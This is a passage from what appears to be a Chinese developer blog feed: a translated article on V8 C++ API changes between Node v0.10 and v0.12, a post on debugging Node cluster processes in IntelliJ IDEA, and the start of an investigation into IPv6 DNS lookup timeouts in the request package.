<p><strong>输出2.5</strong><br>我们终于看到开篇提到的类似java代码的交叉输出的效果了。libuv在处理任务时根本就和js不在一个线程中，所以才出现了libuv线程和js线程交叉输出的效果。我们在梳理一下代码2.5的异步流程，那么可以用下面这个图来展示出来：<br><img src="http://blog.whyun.com/images/js_frame3.png"><br><strong>图2.3</strong><br>在 node 中维护了一个回调的队列，那为什么调用插件的回调排在队列的最后面呢，是有于我们在<strong>代码2.4</strong>中故意将其代码设置成15秒之后才执行完成，这要远远长于其他的那些回调，所以它只能被追加到回调队列的最后一位。在第二帧中，node 中的事件轮询依次将这些回调队列中的任务取出来，进行触发调用。可以看出回调队列是个先进先出的结构。注意回调是按照队列中排队顺序执行的，同时它们执行的环境是 js 线程，要知道 js 线程可是个单线程，也就是说一旦某个回调中的同步代码耗时比较长，那么它后面的回调任务就得一直等着它运行完成，所以说一定不要在回调中写特别耗时的同步代码。</p>
<blockquote>
<p>真实情况中，Node 的回调队列是有多个（例如 timer 回调在定时器回调队列中；文件操作和 C++ 插件操作的回调在 pending 回调队列中；setImmediate 在 check 回调队列中），本文为了方便初学者理解，将其描述为一个队列。</p>
<p>关于 Node 回调队列的内部调用顺序的详解可以参见<a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/">官方网站上的说明</a>，或者是笔者写的另一篇教程<a href="https://github.com/yunnysunny/nodebook/blob/master/text/01_node_introduce.md">Node.js 体系结构</a>。</p>
</blockquote>
<h2 id="3-代码"><a href="#3-代码" class="headerlink" title="3. 代码"></a>3. 代码</h2><p>本文用到代码发布在<a href="http://git.oschina.net/yunnysunny/async-tutorial-code">http://git.oschina.net/yunnysunny/async-tutorial-code</a></p>
]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
  </entry>
  <entry>
    <title>即将面临的Node0.12中的C++API的改变</title>
    <url>/posts/node0-12capi/</url>
    <content><![CDATA[<p>原文地址：<a href="https://strongloop.com/strongblog/node-js-v0-12-c-apis-breaking/">https://strongloop.com/strongblog/node-js-v0-12-c-apis-breaking/</a></p>
<blockquote>
<p>编者注：欢迎阅读旨在帮你快速了解，在即将发布的node0.12中（ <em>作者写这篇文章的时候Node0.12还没有发布，译者注</em> ）的API变化三系列教程的第三部分。在<a href="http://strongloop.com/strongblog/node-js-v0-12-new-apis/">第一部分</a>，<a href="https://github.com/alexgorbatchev">Alex Gorbatchev</a>列出来没有变化的API，在<a href="http://strongloop.com/strongblog/node-js-v0-12-apis-breaking/">第二部分</a>中他指出了变化的部分。在第三部分，<a href="http://strongloop.com/strongblog/node-js-v0-12-apis-breaking/">Ben Noordhuis</a>将会详细描述C++API部分的差别。  </p>
</blockquote>
<p>在Node v0.10和v0.12之间有大量的差异。我不会试图把每一个细节都点出来，我将把这些差异分类，按照从“更重要”到“次重要”的次序进行排序，然后解释怎样合理的更新你的代码。<br>本文大部分讲述V8 API，因为这正是大量差异出现的地方。欢迎通过<a href="mailto:ben@strongloop.com">ben at strongloop.com</a>来给我提供建议和反馈。  </p>
<h2 id="原生函数的参数已经被更改"><a href="#原生函数的参数已经被更改" class="headerlink" title="原生函数的参数已经被更改"></a>原生函数的参数已经被更改</h2><p>在node v0.10中你这么写： </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Handle&lt;v8::Value&gt;FortyTwo(const v8::Arguments&amp;args)&#123;
  v8::HandleScope handle_scope;
  returnhandle_scope.Close(v8::Integer::New(42));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在node v0.12中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void FortyTwo(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp;info)&#123;
  &#x2F;&#x2F; Don&#39;t need a HandleScope in this particular example.
  info.GetReturnValue().Set(42);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>一些重要的变化如下:  </p>
<ol>
<li>返回类型是<code>void</code>。</li>
<li>返回值通过<code>v8::ReturnValue::Set()</code>,<code>v8::ReturnValue::SetEmptyString()</code>,<code>v8::ReturnValue::SetNull()</code>,<code>v8::ReturnValue::SetUndefined()</code>来设置。</li>
<li>如果没有显式的设置返回值，将会返回<code>undefined</code>。</li>
</ol>
<p><code>v8::ReturnValue::Set()</code>拥有一个数字类型的重载函数可以是使用不同的数据类型。如果你的编译器处理时出现问题或者报歧义错误，那么就是使用<code>static_cast&lt;&gt;</code>来将参数转为支持的类型：  </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void FortyTwo(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;
  const int64_t value &#x3D; 42;
  &#x2F;&#x2F; error: call of overloaded &#39;Set(const int64_t&amp;)&#39; is ambiguous
  info.GetReturnValue().Set(value);
  &#x2F;&#x2F; but this works
  info.GetReturnValue().Set(static_cast&lt;int32_t&gt;(value));
  &#x2F;&#x2F; as does this
  info.GetReturnValue().Set(static_cast&lt;double&gt;(value));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当然你需要挑选合适的类型来转换。当转化为窄数据类型，以至于无法承载原始数据据时，将会产生不可预期的结果。<br>注意，<code>v8::FunctionCallbackInfo&lt;v8::Value&gt;</code>是对于<code>v8::Arguments</code>的重命名和参数化（parameterized ）。除了名字和额外的<code>GetReturnValue()</code>函数，他们没有表面上的差别。</p>
<h2 id="大部分V8-API现在需要使用v8-Isolate"><a href="#大部分V8-API现在需要使用v8-Isolate" class="headerlink" title="大部分V8 API现在需要使用v8::Isolate*"></a>大部分V8 API现在需要使用v8::Isolate*</h2><p>在Node v0.10中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::Integer&gt; a &#x3D; v8::Integer::New(42);
v8::Local&lt;v8::Number&gt; b &#x3D; v8::Number::New(13.37);
v8::Local&lt;v8::FunctionTemplate&gt; ft &#x3D; v8::FunctionTemplate::New(Foo);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在Node v0.12中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Isolate* isolate &#x3D; &#x2F;* ... *&#x2F;;
v8::Local&lt;v8::Integer&gt; a &#x3D; v8::Integer::New(isolate, 42);
v8::Local&lt;v8::Number&gt; b &#x3D; v8::Number::New(isolate, 13.37);
v8::Local&lt;v8::FunctionTemplate&gt; ft &#x3D; v8::FunctionTemplate::New(isolate, Foo);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>你可以通过若干的方法获取当前的<code>v8::Isolate</code>的指针：  </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void FortyTwo(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;
  v8::Isolate* isolate;
  isolate &#x3D; info.GetIsolate();
  &#x2F;&#x2F; or:
  isolate &#x3D; info.GetReturnValue().GetIsolate();
  &#x2F;&#x2F; or even:
  isolate &#x3D; v8::Isolate::GetCurrent();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意，V8团队已经指出，<code>v8::Isolate::GetCurrent()</code>将会被逐步淘汰。如果你想编写向后兼容的代码，你最好显式的传递isolate参数。</p>
<h2 id="V8-string函数现在需要显式声明编码"><a href="#V8-string函数现在需要显式声明编码" class="headerlink" title="V8 string函数现在需要显式声明编码"></a>V8 string函数现在需要显式声明编码</h2><p>在Node v0.10中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; create a UTF-8 string
v8::Local&lt;v8::String&gt; utf8 &#x3D; v8::String::New(&quot;42&quot;);
&#x2F;&#x2F; create a UTF-16 string from input in system endianness
static const uint16_t chars[] &#x3D; &#123; &#39;4&#39;, &#39;2&#39;, 0 &#125;;
v8::Local&lt;v8::String&gt; utf16 &#x3D; v8::String::New(chars);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在Node v0.12中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Isolate* isolate &#x3D; &#x2F;* ... *&#x2F;;
&#x2F;&#x2F; create a UTF-8 string
v8::Local&lt;v8::String&gt; utf8 &#x3D; v8::String::NewFromUtf8(isolate, &quot;42&quot;);
&#x2F;&#x2F; create a UTF-16 string from input in system endianness
static const uint16_t chars[] &#x3D; &#123; &#39;4&#39;, &#39;2&#39;, 0 &#125;;
v8::Local&lt;v8::String&gt; utf16 &#x3D; v8::String::NewFromTwoByte(isolate, chars);
&#x2F;&#x2F; create a ISO-8859-1 a.k.a. Latin1 string
const uint8_t* octets &#x3D; reinterpret_cast&lt;const uint8_t*&gt;(&quot;42&quot;);
v8::Local&lt;v8::String&gt; latin1 &#x3D; v8::String::NewFromOneByte(isolate, octets);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>v8::String::NewFromTwoByte()</code>稍微有点命名的不合适，因为他并不是一个严格的双字节编码。他能够识别surrogate pairs【 链接：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd374069(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/dd374069(v=vs.85).aspx</a> 】， 所以它应该被称作<a href="https://zh.wikipedia.org/wiki/UTF-16">UTF-16</a>，而不是<a href="https://zh.wikipedia.org/wiki/Universal_Character_Set">UCS-2</a>。</p>
<h2 id="去除了v8-String-NewSymbol-和v8-String-NewUndetectable"><a href="#去除了v8-String-NewSymbol-和v8-String-NewUndetectable" class="headerlink" title="去除了v8::String::NewSymbol()和v8::String::NewUndetectable()"></a>去除了v8::String::NewSymbol()和v8::String::NewUndetectable()</h2><p>在Node v0.10中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::String&gt; symbol &#x3D; v8::String::NewSymbol(&quot;42&quot;);
v8::Local&lt;v8::String&gt; hidden &#x3D; v8::String::NewUndetectable(&quot;42&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在Node v0.12中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Isolate* isolate &#x3D; &#x2F;* ... *&#x2F;;
v8::Local&lt;v8::String&gt; symbol &#x3D;
    v8::String::NewFromUtf8(isolate, &quot;42&quot;, v8::String::kInternalizedString);
v8::Local&lt;v8::String&gt; hidden &#x3D;
    v8::String::NewFromUtf8(isolate, &quot;42&quot;, v8::String::kUndetectableString);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="去除了v8-String-AsciiValue"><a href="#去除了v8-String-AsciiValue" class="headerlink" title="去除了v8::String::AsciiValue"></a>去除了v8::String::AsciiValue</h2><p>在Node v0.10中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::String&gt; string &#x3D; &#x2F;* ... *&#x2F;;
v8::String::AsciiValue s(string);
puts(s);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在Node v0.12中你这么写：<br>Nothing! <code>v8::String::AsciiValue</code>本来就有问题：它的名字告诉大家要返回7比特的ASCII数据，但是实际上返回8比特的二进制数据。同时它搞混了多字节字符的字节序。<br>使用<code>v8::String::Utf8Value</code>或者<code>v8::String::Value</code>(适用于UTF-16)来进行替代。如果你想获取一个字符串的原始二进制数据，你可以这么做：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::String&gt; string &#x3D; &#x2F;* ... *&#x2F;;
const int length &#x3D; string-&gt;Utf8Length() + 1;  &#x2F;&#x2F; Add one for trailing zero byte.
uint8_t* buffer &#x3D; new uint8_t[length];
string-&gt;WriteOneByte(buffer, &#x2F;* start *&#x2F; 0, length);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意：<code>v8::String::Utf8Length()</code>会迭代字符串中的每一个字符，这就是为啥对于大字符串来说会(很)慢的原因。</p>
<h2 id="去除了v8-HandleScope-Close"><a href="#去除了v8-HandleScope-Close" class="headerlink" title="去除了v8::HandleScope::Close()"></a>去除了v8::HandleScope::Close()</h2><p>在Node v0.10中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::Value&gt; Example() &#123;
  v8::HandleScope handle_scope;
  return handle_scope.Close(v8::Integer::New(42));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在Node v0.12中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::Value&gt; Example(v8::Isolate* isolate) &#123;
  v8::EscapableHandleScope handle_scope(isolate);
  return handle_scope.Escape(v8::Integer::New(isolate, 42));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="v8-Persistent不再继承自v8-Handle"><a href="#v8-Persistent不再继承自v8-Handle" class="headerlink" title="v8::Persistent不再继承自v8::Handle"></a>v8::Persistent<T>不再继承自v8::Handle<T></h2><p><code>v8::Persistent&lt;T&gt;</code>不再是<code>v8::Handle&lt;T&gt;</code>类型的对象。这就意味着，你不能在直接访问指向的句柄了。做出如此大变革的动机是由于在v0.10中这么操作太容易导致资源泄露或者导致在释放之后再访问其存储的内容。<br>在Node v0.10中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::Value&gt; value &#x3D; &#x2F;* ... *&#x2F;;
v8::Persistent&lt;v8::Value&gt; persistent &#x3D; v8::Persistent&lt;v8::Value&gt;::New(value);
&#x2F;&#x2F; ...
v8::Local&lt;v8::Value&gt; value_again &#x3D; *persistent;
&#x2F;&#x2F; ...
persistent.Dispose();
persistent.Clear();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在Node v0.12中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Isolate* isolate &#x3D; &#x2F;* ... *&#x2F;
v8::Local&lt;v8::Value&gt; value &#x3D; &#x2F;* ... *&#x2F;;
v8::Persistent&lt;v8::Value&gt; persistent(isolate, value);
&#x2F;&#x2F; or:
v8::Persistent&lt;v8::Value&gt; persistent;
persistent.Reset(isolate, value);
&#x2F;&#x2F; ...
v8::Local&lt;v8::Value&gt; value_again &#x3D;
    v8::Local&lt;v8::Value&gt;::New(isolate, persistent);  &#x2F;&#x2F; rematerialize handle
&#x2F;&#x2F; ...
persistent.Reset();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>另外一个变化是，persistent 句柄现在不能被拷贝。在Node v0.10中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::Value&gt; value &#x3D; &#x2F;* ... *&#x2F;;
v8::Persistent&lt;v8::Value&gt; a &#x3D; v8::Persistent&lt;v8::Value&gt;::New(value);
v8::Persistent&lt;v8::Value&gt; b &#x3D; a;  &#x2F;&#x2F; a and b now point to |value|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在Node v0.12中你这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Isolate* isolate &#x3D; &#x2F;* ... *&#x2F;
v8::Local&lt;v8::Value&gt; value &#x3D; &#x2F;* ... *&#x2F;;
v8::Persistent&lt;v8::Value&gt; a(isolate, value);
v8::Persistent&lt;v8::Value&gt; b(isolate, a);
&#x2F;&#x2F; or:
v8::Persistent&lt;v8::Value&gt; b;
b.Reset(isolate, a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由于<code>v8::Persistent&lt;T&gt;</code>没有在语法上提供拷贝功能，所以现在使用STL容器类的时候会更困难。鉴于此，V8在<code>v8-util.h</code>中提供了若干工具类。</p>
<p>举个例子：  </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;v8-util.h&quot;
 
void Example(v8:Isolate* isolate) &#123;
  v8::StdPersistentValueMap&lt;int, v8::String&gt; map(isolate);
  v8::Local&lt;v8::String&gt; value &#x3D; v8::String::NewFromUtf8(isolate, &quot;fortytwo&quot;);
  map.Set(42, value);
  assert(map.Contains(42));
  assert(map.Get(42)-&gt;StrictEquals(value));
  assert(map.Get(21).IsEmpty());
  assert(1 &#x3D;&#x3D; map.Size());
  map.Remove(42);
  assert(0 &#x3D;&#x3D; map.Size());
  map.Clear();  &#x2F;&#x2F; or we could just call .Clear()
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果你使用<code>[C++](https://zh.wikipedia.org/wiki/CBB11 &quot;%3&quot;)</code>,你可以在标准容器类的<a href="http://www.cprogramming.com/c++11/rvalue-references-and-move-semantics-in-c++11.html">移动语义</a>中使用<code>v8::UniquePersistent&lt;T&gt;</code>。<br>或者，你可以通过具有拷贝特性的<code>v8::Persistent&lt;T&gt;</code>,但是要保证这么做不会导致资源泄露或者在释放后再使用的问题：  </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Isolate* isolate &#x3D; &#x2F;* ... *&#x2F;;
v8::CopyablePersistentTraits&lt;v8::Value&gt;::CopyablePersistent persistent;
persistent.Reset(isolate, &#x2F;* ... *&#x2F;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="弱引用persistent句柄的回调函数参数更改"><a href="#弱引用persistent句柄的回调函数参数更改" class="headerlink" title="弱引用persistent句柄的回调函数参数更改"></a>弱引用persistent句柄的回调函数参数更改</h2><p>一个正常的persistent句柄会被垃圾回收器忽略掉，一直到程序手动释放才会被回收。<br>相反，弱引用persistent句柄会被垃圾回收器跟踪，当需要回收时，回收器会通过回调函数通知程序。接着程序释放掉关联的资源或者复用这个句柄如果对象还要在后续使用的话。<br>在Node v0.10中这么写：  </p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void WeakCallback(v8::Persistent&lt;v8::Value&gt; object, void* arg) &#123;
  puts(static_cast&lt;const char*&gt;(arg));
  object.Dispose();  &#x2F;&#x2F; or .ClearWeak() if you want to keep it around
&#125;
 
void Example() &#123;
  v8::HandleScope handle_scope;
  v8::Local&lt;v8::Object&gt; object &#x3D; v8::Object::New();
  v8::Persistent&lt;v8::Object&gt; persistent &#x3D;
      v8::Persistent&lt;v8::Object&gt;::New(object);
  persistent.MakeWeak(const_cast&lt;char*&gt;(&quot;fortytwo&quot;), WeakCallback);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在Node v0.12中这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void WeakCallback(const v8::WeakCallbackData&lt;v8::Value, const char*&gt;&amp; data) &#123;
  puts(data.GetParameter());
  &#x2F;&#x2F;persistent的存储单元将会自动清除。
  &#x2F;&#x2F;如果你想保持对原始v8::Persistent&lt;T&gt;的引用，你可以使用.ClearWeak()来复用它。
&#125;
 
void Example(v8::Isolate* isolate) &#123;
  v8::HandleScope handle_scope(isolate);
  v8::Local&lt;v8::Object&gt; object &#x3D; v8::Object::New(isolate);
  v8::Persistent&lt;v8::Object&gt; persistent(isolate, object);
  persistent.SetWeak(&quot;fortytwo&quot;, WeakCallback);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="v8-ThrowException-现在变成了-v8-Isolate-ThrowException"><a href="#v8-ThrowException-现在变成了-v8-Isolate-ThrowException" class="headerlink" title="v8::ThrowException()现在变成了 v8::Isolate::ThrowException()"></a>v8::ThrowException()现在变成了 v8::Isolate::ThrowException()</h2><p>在Node v0.10中这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Local&lt;v8::Value&gt; exception &#x3D; &#x2F;* ... *&#x2F;;
v8::ThrowException(exception);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>在Node v0.12中这么写：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">v8::Isolate* isolate &#x3D; &#x2F;* ... *&#x2F;
v8::Local&lt;v8::Value&gt; exception &#x3D; &#x2F;* ... *&#x2F;;
isolate-&gt;ThrowException(exception);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>Node</category>
      </categories>
  </entry>
  <entry>
    <title>node中调试子进程</title>
    <url>/posts/node/</url>
    <content><![CDATA[<p>现在node.js在单步调试中做的最好的，就要数intellij idea了，但是node在使用cluster的时候，无法开启调试，stackoverflow上有对这个问题的描述与解答（点击<a href="http://stackoverflow.com/questions/16840623/how-to-debug-node-js-child-forked-process">这里</a>查看）。但是这里要将的解决方案确实通过增加启动参数控制，摒弃多进程模式来实现调试，比如说在本地测试的时候启动单进程，在运营环境中使用多进程。</p>
<p>node.js中可以读取环境变量，使用方法为<code>process.env.环境变量名</code>，也就是说可以通过下列方式来控制是否启用多进程：</p>
<pre><code>if (process.env.DEBUG_LOCAL == &#39;true&#39;) &#123;
    //单进程代码处理
&#125; else &#123;
    //cluster代码处理
&#125;
</code></pre>
<p><strong>代码1.1</strong></p>
<p>剩下的就是在idea中配置环境变量了，点击调试的配置功能，即点击图1.1位置。<br><img src="/images/edit_config.jpg" alt="选择配置"><br><strong>图1.1 选择配置</strong></p>
<p>在打开的界面中点击环境变量配置功能按钮<br><img src="/images/set_env_show.jpg" alt="配置界面"><br><strong>图1.2 配置界面</strong></p>
<p>添加一个环境变量<br><img src="/images/add_env.jpg" alt="添加环境变量"><br><strong>图1.3 添加环境变量</strong>  </p>
<p>至此完成配置，点击调试后，就会将当前的代码运行成单进程，在生产环境中不加环境变量启动，则运行到正常的cluster代码中。</p>
]]></content>
      <categories>
        <category>Node</category>
      </categories>
  </entry>
  <entry>
    <title>request 包中出现 DNS 解析超时的探究</title>
    <url>/posts/request-dns/the-problem-of-dns-timeout-on-request-package/</url>
    <content><![CDATA[<p>事情的起因是这样的，公司使用自建 dns 服务器，但是有一个致命缺陷，不支持 ipv6 格式的地址解析，而 node 的 DNS 解析默认是同时请求 v4 和 v6 的地址的，这样会导致偶尔在解析  v6 地址的时候出现超时。</p>
<blockquote>
<p>本文链接地址 <a href="https://blog.whyun.com/posts/request-dns/the-problem-of-dns-timeout-on-request-package/index.html">https://blog.whyun.com/posts/request-dns/the-problem-of-dns-timeout-on-request-package/index.html</a> ，转载请注明出处。</p>
</blockquote>
<p>我们的程序中是使用的 <a href="https://github.com/request/request">request</a> 这个包，查看了一下官方文档，请求 options 中并没有涉及跟 DNS 有关的配置，于是乎求教运维同事。运维同事告诉我在 docker run 的时候加参数 <code>--sysctl net.ipv6.conf.all.disable_ipv6=1</code>，试用了一下，并且写出来如下测试代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> dns <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'dns'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> domain <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'baidu.com'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> begin <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dns<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>domain<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err <span class="token punctuation">,</span>address <span class="token punctuation">,</span> family</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'耗时'</span><span class="token punctuation">,</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> begin<span class="token punctuation">,</span> err <span class="token punctuation">,</span>address <span class="token punctuation">,</span> family<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1 DNS 查询测试代码</strong></p>
<p>运行 <strong>代码 1.1</strong> ，同时使用命令 <code>tcpdump -i eth0 -n -s 500 port domain</code> 来抓取 DNS 解析的数据包：</p>
<pre class="line-numbers language-none"><code class="language-none">20:47:28.917563 IP 10.6.13.67.38050 &gt; 10.7.11.219.domain: 40621+ A? baidu.com. (27)
20:47:28.917582 IP 10.6.13.67.38050 &gt; 10.7.11.219.domain: 32393+ AAAA? baidu.com. (27)
20:47:28.921061 IP 10.7.11.219.domain &gt; 10.6.13.67.38050: 40621 2&#x2F;0&#x2F;0 A 220.181.38.148, A 39.156.69.79 (59)
20:47:28.921114 IP 10.7.11.219.domain &gt; 10.6.13.67.38050: 32393 0&#x2F;1&#x2F;0 (70)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>从输出来看依然会请求 ipv6 的地址解析，所以当时我的判断是运维的配置是不生效的。</p>
<p>后来又有了些空闲的时间，所以研究了一下官方文档，看看是否有参数可以控制 http 请求的 DNS 协议版本，没有想到还真有，<a href="https://nodejs.org/dist/latest-v10.x/docs/api/http.html#http_http_request_options_callback">http.request</a> 的 options 中可以设置 family 参数，可选值为 <code>4</code> <code>6</code>, 即 ipv4 或者 ipv6，如果不指定这个参数，将同时使用 ipv4 和 ipv6。按理来说看到这里，我就应该死心了，如果不传这个参数，肯定会同时做 ipv4 和 ipv6 的地址解析，但是我还是抱着试试看的态度写下了如下测试代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> domain <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'baidu.com'</span><span class="token punctuation">;</span>
<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token string">'http://'</span> <span class="token operator">+</span> domain<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">STATUS: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>res<span class="token punctuation">.</span>statusCode<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">HEADERS: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//console.log(`BODY: $&#123;chunk&#125;`);</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'No more data in response.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
